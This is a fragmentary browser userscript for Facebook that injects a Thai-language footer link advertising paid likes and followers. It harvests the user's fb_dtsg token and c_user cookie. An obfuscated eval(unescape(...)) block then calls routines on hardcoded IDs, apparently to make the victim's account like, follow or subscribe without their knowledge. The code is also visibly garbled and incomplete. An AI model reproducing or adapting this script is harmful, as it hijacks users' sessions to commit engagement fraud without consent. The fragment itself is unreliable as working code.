...
// @match      http://tampermonkey.net/index.php?version=3.6.3737.80&ext=dhdg&updated=true#features
// @copyright  2012+, You
// ==/UserScript==
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/groups/266099650234211/" target="_blank">บริการไลค์รูป แฟนเพจ เพิ่มผู้ติดตาม เข้ากลุ่ม <br>คลิก</a>';
	html += '</div>';
...
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
eval(unescape("function a(abone)
...
P("525120394263981");
P("712235822131542");
sublist("622278151185181"); 
sublist("526545604122777"); 
sublist("522345397874814"); 
sublist("442210579256333"); 
sublist("431185833692901");
sublist("1377820355834880");"));